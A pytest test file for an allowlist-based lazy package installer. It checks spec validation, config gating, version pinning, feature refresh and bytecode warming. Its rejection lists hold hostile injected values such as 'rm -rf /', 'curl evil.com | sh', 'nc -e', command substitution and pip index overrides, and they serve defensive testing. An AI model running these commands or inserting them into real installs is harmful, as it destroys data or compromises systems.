"""Tests for tools.lazy_deps — the supply-chain-resilient on-demand installer.

The lazy_deps module is the architectural fix for the "one quarantined
package nukes 10 unrelated extras" problem. It exposes ``ensure(feature)``
which only installs from a strict allowlist, refuses anything that looks
like a URL / file path, runs venv-scoped, and respects the
``security.allow_lazy_installs`` config flag.

These tests cover the security boundary and the public API. The real pip
call is mocked — we never actually shell out during unit tests.
"""

from __future__ import annotations


import pytest

import tools.lazy_deps as ld


# ---------------------------------------------------------------------------
# Spec safety
# ---------------------------------------------------------------------------


class TestSpecSafety:
    @pytest.mark.parametrize("spec", [
        "mistralai>=2.3.0,<3",
        "elevenlabs>=1.0,<2",
        "honcho-ai>=2.2.0,<3",
        "boto3>=1.35.0,<2",
        "mautrix[encryption]>=0.20,<1",
        "google-api-python-client>=2.100,<3",
        "youtube-transcript-api>=1.2.0",
        "qrcode>=7.0,<8",
        "package",  # bare name, no version
        "package==1.0.0",
        "package~=1.0",
    ])
    def test_safe_specs_pass(self, spec):
        assert ld._spec_is_safe(spec), f"expected {spec!r} to be safe"

    @pytest.mark.parametrize("spec", [
        # URL-shaped → rejected (no remote origin override allowed)
        "git+https://github.com/foo/bar.git",
        "https://example.com/foo.tar.gz",
        # File path → rejected
        "/etc/passwd",
        "./local-malware",
        "../escape",
        # Shell metacharacters → rejected
        "package; rm -rf /",
        "package && curl evil.com | sh",
        "package`whoami`",
        "package$(whoami)",
        "package|nc -e",
        # Pip flag injection → rejected
        "--index-url=http://evil/",
        "-r requirements.txt",
        # Whitespace control chars → rejected
        "package\nshell-injection",
        "package\rmore",
        # Empty / overly long → rejected
        "",
        "x" * 500,
    ])
    def test_unsafe_specs_rejected(self, spec):
        assert not ld._spec_is_safe(spec), \
            f"expected {spec!r} to be rejected"


# ---------------------------------------------------------------------------
# Allowlist enforcement
# ---------------------------------------------------------------------------


class TestAllowlist:
    def test_unknown_feature_raises(self, monkeypatch):
        monkeypatch.setattr(ld, "_allow_lazy_installs", lambda: True)
        with pytest.raises(ld.FeatureUnavailable, match="not in LAZY_DEPS"):
            ld.ensure("not.a.real.feature")


    def test_feature_install_command_unknown(self):
        assert ld.feature_install_command("not.real") is None
        assert ld.feature_install_command("not.real", venv_pip=True) is None

    def test_openwakeword_linux_python_boundary(self):
        assert ld.openwakeword_supported((3, 11), sys_platform="linux") is True
        assert ld.openwakeword_supported((3, 12), sys_platform="linux") is False
        assert ld.openwakeword_supported((3, 14), sys_platform="linux") is False

    def test_openwakeword_darwin_bridge_is_not_blocked_by_linux_tflite_boundary(self):
        assert ld.openwakeword_supported((3, 12), sys_platform="darwin") is True
        assert ld.openwakeword_supported((3, 13), sys_platform="darwin") is True

    def test_openwakeword_windows_onnx_path_is_not_blocked_by_linux_tflite_boundary(self):
        assert ld.openwakeword_supported((3, 12), sys_platform="win32") is True
        assert ld.openwakeword_supported((3, 13), sys_platform="win32") is True

    def test_openwakeword_unsupported_fails_before_pip(self, monkeypatch):
        monkeypatch.setattr(ld, "openwakeword_supported", lambda: False)
        monkeypatch.setattr(ld, "_is_satisfied", lambda spec: False)
        monkeypatch.setattr(
            ld,
            "_venv_pip_install",
            lambda *a, **kw: pytest.fail("pip must not run for unsupported Python"),
        )
        monkeypatch.setattr(
            ld,
            "_allow_lazy_installs",
            lambda: pytest.fail("installer policy must not be probed"),
        )

        with pytest.raises(ld.FeatureUnavailable, match="Python 3.12"):
            ld.ensure("wake.openwakeword", prompt=False)

    def test_feature_install_command_venv_pip_targets_interpreter(self):
        # venv_pip=True must target the running interpreter's pip (correct in
        # every install layout, immune to PEP 668) and carry the same specs
        # as the default uv form.
        import sys as _sys
        default = ld.feature_install_command("platform.teams")
        venv = ld.feature_install_command("platform.teams", venv_pip=True)
        assert default is not None and venv is not None
        assert venv.startswith(f"{_sys.executable} -m pip install ")
        assert default.startswith("uv pip install ")
        # Same spec tail on both forms.
        assert venv.split(" -m pip install ", 1)[1] == default.split("uv pip install ", 1)[1]


# ---------------------------------------------------------------------------
# allow_lazy_installs gating
# ---------------------------------------------------------------------------


class TestSecurityGating:
    def test_disabled_via_config_raises(self, monkeypatch):
        # Pretend honcho is missing AND lazy installs are disabled.
        monkeypatch.setitem(ld.LAZY_DEPS, "test.feat", ("packageX>=1.0,<2",))
        monkeypatch.setattr(ld, "_is_satisfied", lambda spec: False)
        monkeypatch.setattr(ld, "_allow_lazy_installs", lambda: False)
        with pytest.raises(ld.FeatureUnavailable, match="lazy installs disabled"):
            ld.ensure("test.feat", prompt=False)


    def test_config_failure_fails_open(self, monkeypatch):
        # If config can't be read at all, we ALLOW installs rather than
        # blocking the user out of their own backends.
        monkeypatch.delenv("HERMES_DISABLE_LAZY_INSTALLS", raising=False)
        monkeypatch.setattr(
            "hermes_cli.config.load_config",
            lambda: (_ for _ in ()).throw(RuntimeError("config broken")),
        )
        assert ld._allow_lazy_installs() is True


# ---------------------------------------------------------------------------
# ensure() happy/sad paths
# ---------------------------------------------------------------------------


class TestEnsure:
    def test_already_satisfied_is_noop(self, monkeypatch):
        # If the package is importable, ensure() returns without calling pip.
        monkeypatch.setitem(ld.LAZY_DEPS, "test.satisfied", ("zzzfake>=1",))
        monkeypatch.setattr(ld, "_is_satisfied", lambda spec: True)
        # If pip were called, this would fail loudly.
        monkeypatch.setattr(
            ld, "_venv_pip_install",
            lambda *a, **kw: pytest.fail("pip should not be called"),
        )
        ld.ensure("test.satisfied", prompt=False)  # no exception


    def test_install_succeeds_but_still_missing_raises(self, monkeypatch):
        # Pip says success but the package still isn't importable
        # (e.g. site-packages caching, wrong python). Surface this.
        monkeypatch.setitem(ld.LAZY_DEPS, "test.cache", ("zzzfake>=1",))
        monkeypatch.setattr(ld, "_is_satisfied", lambda spec: False)
        monkeypatch.setattr(ld, "_allow_lazy_installs", lambda: True)
        monkeypatch.setattr(
            ld, "_venv_pip_install",
            lambda specs, **kw: ld._InstallResult(True, "ok", ""),
        )
        with pytest.raises(ld.FeatureUnavailable, match="still not importable"):
            ld.ensure("test.cache", prompt=False)


# ---------------------------------------------------------------------------
# is_available
# ---------------------------------------------------------------------------


class TestIsAvailable:
    def test_unknown_feature_returns_false(self):
        assert ld.is_available("not.a.thing") is False


    def test_missing_returns_false(self, monkeypatch):
        monkeypatch.setitem(ld.LAZY_DEPS, "test.miss", ("zzzfake>=1",))
        monkeypatch.setattr(ld, "_is_satisfied", lambda spec: False)
        assert ld.is_available("test.miss") is False


# ---------------------------------------------------------------------------
# Version-aware _is_satisfied (Piece B — "stale pin" detection)
#
# The original implementation returned True the moment the package name
# was importable, ignoring the spec's version range. That meant pin bumps
# in LAZY_DEPS never propagated to users who already lazy-installed the
# backend at an older version. _is_satisfied now parses the spec and
# checks the installed version against the constraint.
# ---------------------------------------------------------------------------


class TestIsSatisfiedVersionAware:
    def _fake_version(self, monkeypatch, installed_versions: dict):
        """Patch importlib.metadata.version() inside lazy_deps."""
        from importlib.metadata import PackageNotFoundError

        def _version(pkg):
            if pkg in installed_versions:
                return installed_versions[pkg]
            raise PackageNotFoundError(pkg)

        # Patch at the import site lazy_deps uses (inside the function).
        import importlib.metadata as _md
        monkeypatch.setattr(_md, "version", _version)

    def test_exact_pin_match_returns_true(self, monkeypatch):
        self._fake_version(monkeypatch, {"honcho-ai": "2.2.0"})
        assert ld._is_satisfied("honcho-ai==2.2.0") is True


    def test_range_within_returns_true(self, monkeypatch):
        self._fake_version(monkeypatch, {"slack-bolt": "1.27.0"})
        assert ld._is_satisfied("slack-bolt>=1.18.0,<2") is True


    def test_bare_package_name_presence_is_enough(self, monkeypatch):
        # No version constraint — presence alone counts as satisfied.
        self._fake_version(monkeypatch, {"somepkg": "1.0.0"})
        assert ld._is_satisfied("somepkg") is True

    def test_extras_block_in_spec_is_stripped(self, monkeypatch):
        # mautrix[encryption]==0.21.0 — the [encryption] block must not
        # confuse the specifier parser.
        self._fake_version(monkeypatch, {"mautrix": "0.21.0"})
        assert ld._is_satisfied("mautrix[encryption]==0.21.0") is True

    def test_extras_block_mismatch_returns_false(self, monkeypatch):
        self._fake_version(monkeypatch, {"mautrix": "0.20.0"})
        assert ld._is_satisfied("mautrix[encryption]==0.21.0") is False

    def test_trace_upload_hub_at_core_locked_version_is_current(self, monkeypatch):
        """#60783 regression: refresh must not churn the shared hub install.

        huggingface-hub arrives in the venv via the core lock (transformers /
        sentence-transformers for local Hindsight, faster-whisper, tokenizers).
        With the LAZY_DEPS pin held in lockstep with uv.lock, the version the
        core installs satisfies the trace-upload spec, so the `hermes update`
        lazy-refresh pass reports "current" instead of reinstalling — the
        downgrade that used to break the Hindsight daemon can't happen.
        """
        spec = ld.LAZY_DEPS["tool.trace_upload"][0]
        pinned = ld._specifier_from_spec(spec).lstrip("=")
        self._fake_version(monkeypatch, {"huggingface-hub": pinned})
        assert ld._is_satisfied(spec) is True
        assert ld.feature_missing("tool.trace_upload") == ()

    @pytest.mark.parametrize(
        ("feature", "installed_versions", "expected_repairs"),
        [
            (
                "skill.google_workspace",
                {
                    "google-api-python-client": "2.194.0",
                    "google-auth": "2.55.0",
                    "google-auth-oauthlib": "1.3.1",
                    "google-auth-httplib2": "0.3.1",
                    "httplib2": "0.31.2",
                    "pyasn1": "0.6.3",
                },
                (
                    "google-auth==2.55.1",
                    "httplib2==0.32.0",
                    "pyasn1==0.6.4",
                ),
            ),
            (
                "provider.vertex",
                {
                    "google-auth": "2.55.1",
                    "pyasn1": "0.6.3",
                },
                ("pyasn1==0.6.4",),
            ),
        ],
    )
    def test_google_features_repair_stale_transitives(
        self,
        monkeypatch,
        feature,
        installed_versions,
        expected_repairs,
    ):
        self._fake_version(monkeypatch, installed_versions)
        monkeypatch.setattr(ld, "_allow_lazy_installs", lambda: True)
        installed = []

        def fake_install(specs, **kwargs):
            installed.extend(specs)
            for spec in specs:
                package, wanted = spec.split("==", 1)
                installed_versions[package] = wanted
            return ld._InstallResult(True, "ok", "")

        monkeypatch.setattr(ld, "_venv_pip_install", fake_install)

        ld.ensure(feature, prompt=False)

        assert tuple(installed) == expected_repairs


# ---------------------------------------------------------------------------
# active_features + refresh_active_features (Piece A — hermes update wiring)
# ---------------------------------------------------------------------------


class TestActiveFeatures:
    def test_no_packages_installed_returns_empty(self, monkeypatch):
        monkeypatch.setattr(ld, "_is_present", lambda spec: False)
        assert ld.active_features() == []


    def test_shared_dependency_does_not_activate_feature(self, monkeypatch):
        # asyncpg is a generic dependency that may be installed for unrelated
        # reasons. It must not make hermes update try to refresh Matrix unless
        # the Matrix anchor package (mautrix) is present.
        monkeypatch.setattr(
            ld, "_is_present",
            lambda spec: ld._pkg_name_from_spec(spec) == "asyncpg",
        )
        assert "platform.matrix" not in ld.active_features()


class TestRefreshActiveFeatures:
    def test_no_active_features_returns_empty(self, monkeypatch):
        monkeypatch.setattr(ld, "active_features", lambda: [])
        assert ld.refresh_active_features() == {}

    def test_windows_matrix_refresh_is_skipped_before_pip(self, monkeypatch):
        # Matrix E2EE pulls python-olm, which has no native Windows wheel/build
        # path. `hermes update` must not retry that doomed install every run.
        #
        # The subject here is the *consumer* — refresh_active_features honouring
        # the gate before pip — so we monkeypatch lazy_deps' own platform probe
        # instead of faking the host, which keeps this covered on Linux too.
        monkeypatch.setattr(
            ld,
            "_unsupported_feature_reason",
            lambda feature: (
                "unsupported on Windows: Matrix E2EE depends on python-olm"
                if feature == "platform.matrix"
                else None
            ),
        )
        monkeypatch.setattr(ld, "active_features", lambda: ["platform.matrix"])
        monkeypatch.setattr(ld, "_is_satisfied", lambda spec: False)
        monkeypatch.setattr(ld, "_allow_lazy_installs", lambda: True)
        monkeypatch.setattr(
            ld,
            "_venv_pip_install",
            lambda *a, **kw: pytest.fail("pip should not be called for unsupported Matrix on Windows"),
        )

        result = ld.refresh_active_features()

        assert result["platform.matrix"].startswith("skipped:")
        assert "unsupported on Windows" in result["platform.matrix"]

    @pytest.mark.windows_only
    def test_matrix_probe_reports_unsupported_on_real_windows(self):
        # The probe itself keys off the real host: patching sys.platform only
        # proved the string, never that Windows actually hits this gate.
        assert "unsupported on Windows" in (
            ld._unsupported_feature_reason("platform.matrix") or ""
        )

    def test_restore_snapshot_skips_telegram_with_lazy_installs_disabled(
        self, monkeypatch
    ):
        """The security opt-out also blocks updater-driven restoration."""
        monkeypatch.setattr(ld, "_allow_lazy_installs", lambda: False)
        monkeypatch.setattr(ld, "_is_satisfied", lambda spec: False)
        monkeypatch.setattr(
            ld,
            "_venv_pip_install",
            lambda *args, **kwargs: pytest.fail(
                "pip must not run when lazy installs are disabled"
            ),
        )

        result = ld.restore_features(["platform.telegram"])

        assert result == {
            "platform.telegram": (
                "skipped: lazy installs disabled "
                "(security.allow_lazy_installs=false)"
            )
        }

    def test_restore_snapshot_does_not_install_never_activated_features(
        self, monkeypatch
    ):
        monkeypatch.setattr(
            ld,
            "_venv_pip_install",
            lambda *args, **kwargs: pytest.fail(
                "cold features must stay uninstalled"
            ),
        )

        assert ld.restore_features([]) == {}

    def test_mixed_results_returns_per_feature_status(self, monkeypatch):
        monkeypatch.setattr(ld, "active_features", lambda: ["a.ok", "b.fail"])
        monkeypatch.setitem(ld.LAZY_DEPS, "a.ok", ("pkga==1.0",))
        monkeypatch.setitem(ld.LAZY_DEPS, "b.fail", ("pkgb==1.0",))
        # a.ok: already satisfied → "current"
        # b.fail: missing + install fails → "failed:"
        def fake_satisfied(spec):
            return ld._pkg_name_from_spec(spec) == "pkga"
        monkeypatch.setattr(ld, "_is_satisfied", fake_satisfied)
        monkeypatch.setattr(ld, "_allow_lazy_installs", lambda: True)
        monkeypatch.setattr(
            ld, "_venv_pip_install",
            lambda specs, **kw: ld._InstallResult(False, "", "nope"),
        )
        result = ld.refresh_active_features()
        assert result["a.ok"] == "current"
        assert result["b.fail"].startswith("failed:")


# ---------------------------------------------------------------------------
# install_specs — manifest-driven installs (dashboard memory providers etc.)
#
# NS-605: the dashboard's memory-provider setup endpoint used to shell out
# to `uv pip install --python sys.executable`, which fails with a permission
# error on the sealed hosted venv. install_specs routes those installs
# through the same environment-aware pipeline as ensure(): venv-scoped on
# normal installs, redirected to the durable target on immutable images,
# and cleanly refused (with a reason) when installs are gated off.
# ---------------------------------------------------------------------------


class TestInstallSpecs:
    def test_empty_specs_is_trivially_ok(self, monkeypatch):
        monkeypatch.setattr(
            ld, "_venv_pip_install",
            lambda *a, **kw: pytest.fail("pip should not be called"),
        )
        result = ld.install_specs([])
        assert result.ok is True
        assert result.blocked is False

    def test_blank_specs_are_ignored(self, monkeypatch):
        monkeypatch.setattr(
            ld, "_venv_pip_install",
            lambda *a, **kw: pytest.fail("pip should not be called"),
        )
        result = ld.install_specs(["", "   "])
        assert result.ok is True

    @pytest.mark.parametrize("bad", [
        "pkg; rm -rf /",
        "-e git+https://evil.example/repo.git",
        "https://evil.example/pkg.tar.gz",
        "../../etc/passwd",
        "pkg @ file:///tmp/x",
    ])
    def test_unsafe_specs_are_blocked_before_any_install(self, monkeypatch, bad):
        monkeypatch.setattr(
            ld, "_venv_pip_install",
            lambda *a, **kw: pytest.fail("pip should not be called"),
        )
        result = ld.install_specs([bad])
        assert result.ok is False
        assert result.blocked is True
        assert "unsafe spec" in result.reason

    def test_one_unsafe_spec_blocks_the_whole_batch(self, monkeypatch):
        monkeypatch.setattr(
            ld, "_venv_pip_install",
            lambda *a, **kw: pytest.fail("pip should not be called"),
        )
        result = ld.install_specs(["honcho-ai==2.2.0", "pkg; rm -rf /"])
        assert result.blocked is True


    def test_never_raises_on_unexpected_error(self, monkeypatch):
        monkeypatch.delenv("HERMES_DISABLE_LAZY_INSTALLS", raising=False)
        monkeypatch.delenv(ld._LAZY_TARGET_ENV, raising=False)
        monkeypatch.setattr(
            "hermes_cli.config.load_config", lambda: {}, raising=False
        )
        # Contract: install_specs never raises — even an unexpected installer
        # crash comes back as a failed result the caller can render.
        def boom(specs, **kw):
            raise RuntimeError("disk on fire")
        monkeypatch.setattr(ld, "_venv_pip_install", boom)
        result = ld.install_specs(["honcho-ai==2.2.0"])
        assert result.ok is False
        assert "disk on fire" in result.stderr


# ---------------------------------------------------------------------------
# Post-install bytecode warm (#100461)
# ---------------------------------------------------------------------------


class TestWarmInstalledBytecode:
    """A pip/uv install leaves ``.py`` sources with no ``__pycache__``.

    Whoever imports next pays the whole compile, and for a lazily installed
    backend that is the foreground of a user request. These tests pin that
    the installer pays it instead.
    """

    @staticmethod
    def _package(tmp_path):
        pkg = tmp_path / "zzzfakepkg"
        pkg.mkdir()
        (pkg / "__init__.py").write_text("VALUE = 1\n", encoding="utf-8")
        (pkg / "mod.py").write_text("def f():\n    return 2\n", encoding="utf-8")
        return pkg

    def test_compiles_the_installed_package(self, tmp_path, monkeypatch):
        pkg = self._package(tmp_path)
        monkeypatch.setattr(ld, "_installed_dist_roots", lambda spec, target: {pkg})

        assert not list(pkg.rglob("*.pyc"))
        ld._warm_installed_bytecode(("zzzfake==1.0",), None)
        assert len(list(pkg.rglob("*.pyc"))) == 2

    def test_honors_dont_write_bytecode(self, tmp_path, monkeypatch):
        pkg = self._package(tmp_path)
        monkeypatch.setattr(ld, "_installed_dist_roots", lambda spec, target: {pkg})
        monkeypatch.setattr(ld.sys, "dont_write_bytecode", True)

        ld._warm_installed_bytecode(("zzzfake==1.0",), None)
        assert not list(pkg.rglob("*.pyc"))

    def test_compile_failure_never_propagates(self, tmp_path, monkeypatch):
        # An unwritable tree (read-only mount, --target on a sealed image)
        # must not turn a successful install into a failed one.
        def boom(spec, target):
            raise OSError("read-only file system")
        monkeypatch.setattr(ld, "_installed_dist_roots", boom)

        ld._warm_installed_bytecode(("zzzfake==1.0",), None)  # no exception

    def test_dist_roots_resolve_from_metadata_not_the_spec_name(self):
        # The import name is read off the distribution's own file list, so
        # specs whose package name differs from their module name still warm.
        roots = ld._installed_dist_roots("pytest>=8", None)
        assert roots, "pytest is a test dependency and must resolve"
        assert all(r.is_dir() for r in roots)
        assert any(list(r.glob("*.py")) for r in roots)

    def test_unknown_distribution_resolves_to_nothing(self):
        assert ld._installed_dist_roots("zzz-not-installed==9.9", None) == set()

    def test_dist_roots_exclude_metadata_dirs(self):
        # ``*.dist-info`` owns RECORD/METADATA/licenses, never importable
        # code — compiling it is wasted work on every install.
        roots = ld._installed_dist_roots("pytest>=8", None)
        assert roots
        assert not any(r.name.endswith((".dist-info", ".egg-info")) for r in roots)


class TestInstallWarmsBytecode:
    """The warm runs on install success, and only on success."""

    @staticmethod
    def _install(monkeypatch, returncode):
        calls = []
        cmds = []
        monkeypatch.setattr(ld, "_lazy_install_target", lambda: None)
        monkeypatch.setattr(ld.shutil, "which", lambda name: "uv" if name == "uv" else None)
        monkeypatch.setattr(
            "hermes_cli.managed_uv.resolve_uv", lambda *a, **kw: "uv", raising=False
        )

        class _Completed:
            def __init__(self):
                self.returncode = returncode
                self.stdout = "out"
                self.stderr = "err"

        def fake_run(cmd, *a, **kw):
            cmds.append(list(cmd))
            return _Completed()

        monkeypatch.setattr(ld.subprocess, "run", fake_run)
        monkeypatch.setattr(
            ld, "_warm_installed_bytecode",
            lambda specs, target: calls.append((specs, target)),
        )
        result = ld._venv_pip_install(("zzzfake==1.0",))
        return result, calls, cmds

    def test_success_warms_once_with_the_installed_specs(self, monkeypatch):
        result, calls, _ = self._install(monkeypatch, 0)
        assert result.success is True
        assert calls == [(("zzzfake==1.0",), None)]

    def test_failed_install_does_not_warm(self, monkeypatch):
        result, calls, _ = self._install(monkeypatch, 1)
        assert result.success is False
        assert calls == []

    def test_uv_tier_compiles_bytecode_for_the_whole_install(self, monkeypatch):
        # uv does not write __pycache__ unless asked (pip does). The flag
        # covers transitive deps too, which the per-spec warm never sees.
        _, _, cmds = self._install(monkeypatch, 0)
        uv_cmds = [c for c in cmds if c[:3] == ["uv", "pip", "install"]]
        assert len(uv_cmds) == 1
        cmd = uv_cmds[0]
        assert "--compile-bytecode" in cmd
        assert cmd.index("--compile-bytecode") < cmd.index("zzzfake==1.0")
